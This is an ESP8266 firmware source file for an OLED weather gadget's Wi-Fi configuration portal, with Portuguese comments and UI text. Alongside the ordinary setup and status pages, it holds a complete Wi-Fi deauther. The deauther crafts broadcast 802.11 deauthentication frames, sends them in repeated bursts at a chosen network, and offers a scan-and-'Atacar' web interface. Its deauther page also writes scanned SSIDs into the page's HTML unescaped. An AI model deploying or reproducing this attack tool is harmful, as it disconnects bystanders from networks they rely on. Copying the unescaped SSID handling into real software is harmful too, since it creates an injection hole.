#include "wifi_portal.h"

#include <ArduinoJson.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <LittleFS.h>
#include <time.h>

extern "C" {
  #include <user_interface.h>
}

#include "app_state.h"

namespace
{
  constexpr byte DNS_PORT = 53;
  DNSServer dnsServer;

  String escapeHtml(const String &value)
  {
    String escaped;

    for (size_t i = 0; i < value.length(); i++)
    {
      char c = value[i];

      if (c == '&')
        escaped += "&amp;";
      else if (c == '<')
        escaped += "&lt;";
      else if (c == '>')
        escaped += "&gt;";
      else if (c == '"')
        escaped += "&quot;";
      else
        escaped += c;
    }

    return escaped;
  }

  void loadWiFiConfig()
  {
    if (!LittleFS.exists(wifiConfigPath))
    {
      return;
    }

    File file = LittleFS.open(wifiConfigPath, "r");
    if (!file)
    {
      return;
    }

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();

    if (error)
    {
      return;
    }

    wifiSsid = doc["ssid"] | wifiSsid;
    wifiPassword = doc["password"] | wifiPassword;
    weatherUpdateIntervalMs = doc["weather_interval_ms"] | weatherUpdateIntervalMs;
    screenChangeIntervalMs = doc["screen_change_ms"] | screenChangeIntervalMs;
    timezoneOffsetHours = doc["timezone_offset_hours"] | timezoneOffsetHours;
    oledBrightness = doc["oled_brightness"] | oledBrightness;
  }

  bool saveWiFiConfig()
  {
    JsonDocument doc;
    doc["ssid"] = wifiSsid;
    doc["password"] = wifiPassword;
    doc["weather_interval_ms"] = weatherUpdateIntervalMs;
    doc["screen_change_ms"] = screenChangeIntervalMs;
    doc["timezone_offset_hours"] = timezoneOffsetHours;
    doc["oled_brightness"] = oledBrightness;

    File file = LittleFS.open(wifiConfigPath, "w");
    if (!file)
    {
      return false;
    }

    bool ok = serializeJson(doc, file) > 0;
    file.close();
    return ok;
  }

  unsigned long parseULongBounded(const String &raw, unsigned long minValue, unsigned long maxValue, unsigned long fallback)
  {
    if (raw.length() == 0)
    {
      return fallback;
    }

    unsigned long value = strtoul(raw.c_str(), nullptr, 10);
    if (value < minValue)
      return minValue;
    if (value > maxValue)
      return maxValue;
    return value;
  }

  int parseIntBounded(const String &raw, int minValue, int maxValue, int fallback)
  {
    if (raw.length() == 0)
    {
      return fallback;
    }

    long value = strtol(raw.c_str(), nullptr, 10);
    if (value < minValue)
      return minValue;
    if (value > maxValue)
      return maxValue;
    return static_cast<int>(value);
  }

  void applyDisplayAndTimeSettings()
  {
    display.ssd1306_command(SSD1306_SETCONTRAST);
    display.ssd1306_command(oledBrightness);
    configTime(timezoneOffsetHours * 3600, 0, "pool.ntp.org");
  }

  void connectStationWiFi()
  {
    lastConnectAttemptAt = millis();
    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());

    unsigned long startedAt = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startedAt < 15000)
    {
      delay(300);
    }
  }

  String wifiStatusToText(wl_status_t status)
  {
    if (status == WL_CONNECTED)
      return "Conectado";
    if (status == WL_NO_SSID_AVAIL)
      return "SSID nao encontrado";
    if (status == WL_CONNECT_FAILED)
      return "Falha de autenticacao";
    if (status == WL_CONNECTION_LOST)
      return "Conexao perdida";
    if (status == WL_IDLE_STATUS)
      return "Conectando";
    if (status == WL_DISCONNECTED)
      return "Desconectado";
    return "Status desconhecido";
  }

  void startHotspot()
  {
    apSsid = "OLED-" + String(ESP.getChipId(), HEX);

    WiFi.softAPdisconnect(true);
    delay(100);

    bool apStarted = WiFi.softAP(apSsid.c_str(), apPassword, 1, false, 4);

    if (!apStarted)
    {
      WiFi.softAP(apSsid.c_str());
    }

    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  }

  // ─── Deauther ─────────────────────────────────────────────────────────────
  // NOTE: use only on networks you own or have explicit permission to test.
  // Sending deauthentication frames to third-party networks is illegal.

  static bool deauthRunning = false;
  static uint8_t deauthTarget[6] = {0};
  static uint8_t deauthCh = 1;
  static String deauthTargetSsid;
  static unsigned long deauthLastPacket = 0;
  static constexpr unsigned long DEAUTH_INTERVAL_MS = 100;
  static constexpr int DEAUTH_BURST = 5;

  // 802.11 deauthentication management frame
  static uint8_t deauthFrame[26] = {
    0xC0, 0x00,                         // frame control: deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dst: broadcast (kick all clients)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src: target BSSID  (offset 10)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid: target BSSID (offset 16)
    0x00, 0x00,                         // sequence number
    0x07, 0x00                          // reason: class-3 frame from non-assoc STA
  };

  bool parseBssid(const String &str, uint8_t out[6])
  {
    if (str.length() < 17)
      return false;
    for (int i = 0; i < 6; i++)
    {
      out[i] = (uint8_t)strtol(str.substring(i * 3, i * 3 + 2).c_str(), nullptr, 16);
    }
    return true;
  }

  void sendDeauthBurst()
  {
    if (!deauthRunning)
      return;
    unsigned long now = millis();
    if (now - deauthLastPacket < DEAUTH_INTERVAL_MS)
      return;
    deauthLastPacket = now;

    wifi_set_channel(deauthCh);
    memcpy(&deauthFrame[10], deauthTarget, 6);
    memcpy(&deauthFrame[16], deauthTarget, 6);
    for (int i = 0; i < DEAUTH_BURST; i++)
      wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), 0);
  }
  // ──────────────────────────────────────────────────────────────────────────

  void handleCaptiveRedirect()
  {
    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
    server.send(302, "text/plain", "");
  }

  String buildWifiSelectOptions()
  {
    String options;
    int networkCount = WiFi.scanNetworks();

    if (networkCount <= 0)
    {
      options += "<option value=''>Nenhuma rede encontrada</option>";
      return options;
    }

    for (int i = 0; i < networkCount; i++)
    {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0)
      {
        continue;
      }

      int rssi = WiFi.RSSI(i);
      String selected = ssid == wifiSsid ? " selected" : "";
      options += "<option value='" + escapeHtml(ssid) + "'" + selected + ">";
      options += escapeHtml(ssid) + " (" + String(rssi) + " dBm)";
      options += "</option>";
    }

    WiFi.scanDelete();
    return options;
  }

  void handleRoot()
  {
    String wifiOptions = buildWifiSelectOptions();
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}input,select{background:#222;color:#fff}button{background:#00a6ff;color:#fff;font-weight:bold} .card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px} .muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .ok{color:#58d68d}.bad{color:#ff7675}</style></head><body>";
    page += "<div class='card'><h2>Configurar Wi-Fi</h2>";
    page += "<p class='muted'>Conectado ao hotspot: " + apSsid + "</p>";
    page += "<p class='muted'>Status STA: ";
    page += staConnected ? "<span class='ok'>Conectado</span>" : "<span class='bad'>" + wifiStatusToText(staStatus) + "</span>";
    page += "</p>";
    page += "<p class='muted'>IP AP: " + WiFi.softAPIP().toString() + "</p>";
    page += "<p class='muted'>IP STA: ";
    page += staConnected ? WiFi.localIP().toString() : "-";
    page += "</p>";
    page += "<form method='post' action='/save'>";
    page += "<select name='ssid' required>";
    page += wifiOptions;
    page += "</select>";
    page += "<input name='password' placeholder='Senha do Wi-Fi' type='password' value='" + escapeHtml(wifiPassword) + "'>";
    page += "<h3>Ajustes do Sistema</h3>";
    page += "<label>Intervalo do clima (segundos)</label>";
    page += "<input name='weather_sec' type='number' min='10' max='3600' value='" + String(weatherUpdateIntervalMs / 1000) + "'>";
    page += "<label>Fuso horario (UTC, ex: -3)</label>";
    page += "<input name='tz' type='number' min='-12' max='14' value='" + String(timezoneOffsetHours) + "'>";
    page += "<label>Brilho OLED (0-255)</label>";
    page += "<input name='brightness' type='number' min='0' max='255' value='" + String(oledBrightness) + "'>";
    page += "<label>Troca de tela (segundos)</label>";
    page += "<input name='screen_sec' type='number' min='2' max='120' value='" + String(screenChangeIntervalMs / 1000) + "'>";
    page += "<button type='submit'>Salvar e conectar</button></form>";
    page += "<form method='get' action='/'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
    page += "<form method='get' action='/status'><button class='secondary' type='submit'>Ver status completo</button></form>";
    page += "<form method='get' action='/deauther'><button class='secondary' style='background:#3a1a1a;color:#ff7675' type='submit'>&#128246; Wi-Fi Deauther</button></form>";
    page += "<p class='muted'>API: /api/status</p>";
    page += "</div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusPage()
  {
    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#0e0f12;color:#f4f4f4;max-width:620px;margin:0 auto;padding:20px} .card{background:#1a1d23;padding:16px;border-radius:14px;margin:10px 0} .label{color:#9aa4b2;font-size:13px} .value{font-size:18px} .ok{color:#53d769} .bad{color:#ff6b6b} a{color:#7cc7ff} button{width:100%;padding:12px;margin-top:10px;border:0;border-radius:10px;background:#2a2f3a;color:#fff}</style>";
    page += "<script>async function r(){try{const s=await fetch('/api/status');const j=await s.json();document.getElementById('sta').innerText=j.sta_status;document.getElementById('staIp').innerText=j.sta_ip;document.getElementById('ap').innerText=j.ap_ssid;document.getElementById('apIp').innerText=j.ap_ip;document.getElementById('clients').innerText=j.ap_clients;document.getElementById('ssid').innerText=j.saved_ssid;document.getElementById('rssi').innerText=j.rssi;document.getElementById('last').innerText=j.last_connect_attempt_age_ms+' ms';document.getElementById('uptime').innerText=j.uptime_ms+' ms';document.getElementById('temp').innerText=j.temperature_c+' C';document.getElementById('screen').innerText=j.active_screen;}catch(e){}}setInterval(r,2000);window.onload=r;</script></head><body>";
    page += "<h2>Status do Servidor Wi-Fi</h2>";
    page += "<div class='card'><div class='label'>STA Status</div><div class='value' id='sta'>-</div><div class='label'>STA IP</div><div class='value' id='staIp'>-</div><div class='label'>RSSI</div><div class='value' id='rssi'>-</div></div>";
    page += "<div class='card'><div class='label'>AP SSID</div><div class='value' id='ap'>-</div><div class='label'>AP IP</div><div class='value' id='apIp'>-</div><div class='label'>Clientes no AP</div><div class='value' id='clients'>-</div></div>";
    page += "<div class='card'><div class='label'>SSID salvo</div><div class='value' id='ssid'>-</div><div class='label'>Ultima tentativa de conexao</div><div class='value' id='last'>-</div><div class='label'>Uptime</div><div class='value' id='uptime'>-</div><div class='label'>Temperatura</div><div class='value' id='temp'>-</div><div class='label'>Tela ativa</div><div class='value' id='screen'>-</div></div>";
    page += "<button onclick=\"location.href='/'\">Voltar para configuracao</button>";
    page += "<div class='card'><a href='/api/status'>Abrir JSON de status</a></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusJson()
  {
    JsonDocument doc;
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;

    doc["sta_status"] = wifiStatusToText(staStatus);
    doc["sta_connected"] = staConnected;
    doc["sta_ip"] = staConnected ? WiFi.localIP().toString() : String("-");
    doc["rssi"] = staConnected ? String(WiFi.RSSI()) + " dBm" : String("-");
    doc["ap_ssid"] = apSsid;
    doc["ap_ip"] = WiFi.softAPIP().toString();
    doc["ap_clients"] = WiFi.softAPgetStationNum();
    doc["saved_ssid"] = wifiSsid;
    doc["last_connect_attempt_ms"] = lastConnectAttemptAt;
    doc["last_connect_attempt_age_ms"] = lastConnectAttemptAt > 0 ? millis() - lastConnectAttemptAt : 0;
    doc["uptime_ms"] = millis();
    doc["temperature_c"] = temp;
    doc["active_screen"] = screen;
    doc["weather_update_interval_ms"] = weatherUpdateIntervalMs;
    doc["screen_change_interval_ms"] = screenChangeIntervalMs;
    doc["timezone_offset_hours"] = timezoneOffsetHours;
    doc["oled_brightness"] = oledBrightness;
    doc["deauth_running"] = deauthRunning;
    doc["deauth_target_ssid"] = deauthTargetSsid;
    {
      char bssidBuf[18] = {0};
      snprintf(bssidBuf, sizeof(bssidBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
               deauthTarget[0], deauthTarget[1], deauthTarget[2],
               deauthTarget[3], deauthTarget[4], deauthTarget[5]);
      doc["deauth_target_bssid"] = deauthRunning ? String(bssidBuf) : String("-");
    }

    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleSave()
  {
    String newSsid = server.arg("ssid");
    String newPassword = server.arg("password");
    unsigned long weatherSec = parseULongBounded(server.arg("weather_sec"), 10, 3600, weatherUpdateIntervalMs / 1000);
    unsigned long screenSec = parseULongBounded(server.arg("screen_sec"), 2, 120, screenChangeIntervalMs / 1000);
    int newTz = parseIntBounded(server.arg("tz"), -12, 14, timezoneOffsetHours);
    int newBrightness = parseIntBounded(server.arg("brightness"), 0, 255, oledBrightness);

    if (newSsid.length() == 0)
    {
      server.send(400, "text/plain; charset=utf-8", "SSID vazio");
      return;
    }

    wifiSsid = newSsid;
    wifiPassword = newPassword;
    weatherUpdateIntervalMs = weatherSec * 1000;
    screenChangeIntervalMs = screenSec * 1000;
    timezoneOffsetHours = newTz;
    oledBrightness = static_cast<uint8_t>(newBrightness);

    applyDisplayAndTimeSettings();
    bool saved = saveWiFiConfig();

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta http-equiv='refresh' content='4;url=/status'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#101216;color:#f4f4f4;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#1b1f27;padding:22px;border-radius:16px;max-width:460px;width:100%}.ok{color:#53d769}.bad{color:#ff6b6b}.loader{width:18px;height:18px;border-radius:50%;border:3px solid #4f5d75;border-top-color:#fff;display:inline-block;animation:s 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes s{to{transform:rotate(360deg)}}</style></head><body>";
    page += "<div class='card'><h3>Salvando configuracao</h3>";
    page += "<p>SSID selecionado: <strong>" + escapeHtml(wifiSsid) + "</strong></p>";
    page += saved ? "<p class='ok'>Dados salvos com sucesso.</p>" : "<p class='bad'>Falha ao salvar no armazenamento.</p>";
    page += "<p><span class='loader'></span>Tentando conectar agora...</p>";
    page += "<p>Voce sera redirecionado para a pagina de status em alguns segundos.</p>";
    page += "<p><a href='/status' style='color:#7cc7ff'>Abrir status agora</a></p></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);

    WiFi.disconnect();
    connectStationWiFi();
  }

  void handleDeautherPage()
  {
    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>";
    page += "body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:640px;margin:0 auto;padding:20px}";
    page += ".card{background:#1b1b1b;padding:16px;border-radius:14px;margin:10px 0}";
    page += "button{padding:9px 16px;border:0;border-radius:8px;cursor:pointer;font-weight:bold}";
    page += ".btn-scan{background:#00a6ff;color:#fff;width:100%;padding:12px;margin:8px 0;border-radius:10px}";
    page += ".btn-atk{background:#ff4757;color:#fff;font-size:12px}";
    page += ".btn-stop{background:#2ed573;color:#000}";
    page += ".btn-back{background:#2a2a2a;color:#fff;width:100%;padding:12px;border-radius:10px;margin-top:8px}";
    page += "table{width:100%;border-collapse:collapse}";
    page += "th,td{text-align:left;padding:7px 5px;border-bottom:1px solid #2a2a2a;font-size:13px}";
    page += "th{color:#aaa;font-size:11px;text-transform:uppercase}";
    page += ".warn{background:#2d1a1a;border-radius:10px;padding:12px;color:#ff7675;font-size:13px;margin-bottom:12px}";
    page += ".statusbar{background:#1a2d1a;border-radius:10px;padding:12px;color:#58d68d;font-size:13px;margin-bottom:12px;display:none;word-break:break-all}";
    page += ".loader{display:inline-block;width:15px;height:15px;border:2px solid #444;border-top-color:#fff;border-radius:50%;animation:sp 0.8s linear infinite;vertical-align:middle;margin-right:6px}";
    page += "@keyframes sp{to{transform:rotate(360deg)}}";
    page += "</style></head><body>";
    page += "<div class='card'>";
    page += "<h2>&#128246; Wi-Fi Deauther</h2>";
    page += "<div class='warn'>&#9888;&#65039; Use apenas em redes pr&oacute;prias ou com permiss&atilde;o expressa. O uso indevido &eacute; ilegal.</div>";
    page += "<div class='statusbar' id='sbar'>&#128225; Deauth ativo: <span id='tname'></span> &nbsp; <button class='btn-stop' onclick='stopDeauth()'>&#9632; Parar</button></div>";
    page += "<button class='btn-scan' onclick='scan()'>&#128268; Escanear Redes</button>";
    page += "<div id='loader' style='display:none;text-align:center;padding:12px'><span class='loader'></span>Escaneando, aguarde...</div>";
    page += "<div id='result'></div>";
    page += "<button class='btn-back' onclick=\"location.href='/'\">&#8592; Voltar</button>";
    page += "</div>";
    page += "<script>";
    page += "var nets=[];";
    page += "var scanning=false;";
    page += "async function scan(){";
    page += "  if(scanning)return;";
    page += "  scanning=true;";
    page += "  document.getElementById('loader').style.display='block';";
    page += "  document.getElementById('result').innerHTML='';";
    page += "  try{";
    page += "    var r=await fetch('/api/scan_ap');";
    page += "    nets=await r.json();";
    page += "    if(nets.length===0){";
    page += "      document.getElementById('result').innerHTML='<p style=\"color:#aaa\">Nenhuma rede encontrada.</p>';";
    page += "    } else {";
    page += "      var h='<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>dBm</th><th></th></tr>';";
    page += "      nets.forEach(function(n,i){";
    page += "        h+='<tr>';";
    page += "        h+='<td>'+n.ssid+'</td>';";
    page += "        h+='<td style=\"font-size:11px\">'+n.bssid+'</td>';";
    page += "        h+='<td>'+n.channel+'</td>';";
    page += "        h+='<td>'+n.rssi+'</td>';";
    page += "        h+='<td><button class=\"btn-atk\" onclick=\"startDeauth('+i+')\">&#9889; Atacar</button></td>';";
    page += "        h+='</tr>';";
    page += "      });";
    page += "      h+='</table>';";
    page += "      document.getElementById('result').innerHTML=h;";
    page += "    }";
    page += "  } catch(e){";
    page += "    document.getElementById('result').innerHTML='<p style=\"color:#ff7675\">Erro ao escanear.</p>';";
    page += "  }";
    page += "  document.getElementById('loader').style.display='none';";
    page += "  scanning=false;";
    page += "}";
    page += "async function startDeauth(idx){";
    page += "  var n=nets[idx];";
    page += "  var fd=new FormData();";
    page += "  fd.append('bssid',n.bssid);";
    page += "  fd.append('channel',n.channel);";
    page += "  fd.append('ssid',n.ssid);";
    page += "  var r=await fetch('/api/deauth/start',{method:'POST',body:fd});";
    page += "  var j=await r.json();";
    page += "  if(j.ok){";
    page += "    document.getElementById('tname').innerText=n.ssid+' ('+n.bssid+')';";
    page += "    document.getElementById('sbar').style.display='block';";
    page += "  }";
    page += "}";
    page += "async function stopDeauth(){";
    page += "  await fetch('/api/deauth/stop',{method:'POST'});";
    page += "  document.getElementById('sbar').style.display='none';";
    page += "}";
    page += "</script></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleScanAp()
  {
    int n = WiFi.scanNetworks();

    if (n < 0)
    {
      server.send(503, "application/json; charset=utf-8", "{\"error\":\"Falha ao escanear redes\"}");
      return;
    }

    JsonDocument doc;
    JsonArray arr = doc.to<JsonArray>();

    for (int i = 0; i < n; i++)
    {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0)
        continue;
      JsonObject obj = arr.add<JsonObject>();
      obj["ssid"] = ssid;
      obj["bssid"] = WiFi.BSSIDstr(i);
      obj["channel"] = WiFi.channel(i);
      obj["rssi"] = WiFi.RSSI(i);
    }

    WiFi.scanDelete();

    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleDeauthStart()
  {
    String bssidStr = server.arg("bssid");
    String chStr = server.arg("channel");
    String ssidStr = server.arg("ssid");

    uint8_t parsed[6];
    if (!parseBssid(bssidStr, parsed))
    {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"error\":\"BSSID invalido\"}");
      return;
    }

    int ch = parseIntBounded(chStr, 1, 13, 1);

    memcpy(deauthTarget, parsed, 6);
    deauthCh = (uint8_t)ch;
    deauthTargetSsid = ssidStr;
    deauthRunning = true;
    deauthLastPacket = 0;

    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
  }

  void handleDeauthStop()
  {
    deauthRunning = false;
    memset(deauthTarget, 0, 6);
    deauthTargetSsid = "";
    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
  }

  void startConfigPortal()
  {
    server.on("/", HTTP_GET, handleRoot);
    server.on("/generate_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/gen_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/hotspot-detect.html", HTTP_GET, handleCaptiveRedirect);
    server.on("/ncsi.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/connecttest.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/fwlink", HTTP_GET, handleCaptiveRedirect);
    server.on("/status", HTTP_GET, handleStatusPage);
    server.on("/api/status", HTTP_GET, handleStatusJson);
    server.on("/save", HTTP_POST, handleSave);
    server.on("/deauther", HTTP_GET, handleDeautherPage);
    server.on("/api/scan_ap", HTTP_GET, handleScanAp);
    server.on("/api/deauth/start", HTTP_POST, handleDeauthStart);
    server.on("/api/deauth/stop", HTTP_POST, handleDeauthStop);
    server.onNotFound(handleCaptiveRedirect);
    server.begin();
  }
} // namespace

void initWiFiAndPortal()
{
  LittleFS.begin();
  loadWiFiConfig();

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);
  delay(100);

  startHotspot();
  startConfigPortal();
  applyDisplayAndTimeSettings();

  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 10);
  display.println("Conectando WiFi...");
  display.display();

  connectStationWiFi();
}

void handlePortalClient()
{
  server.handleClient();
  dnsServer.processNextRequest();
  sendDeauthBurst();
}
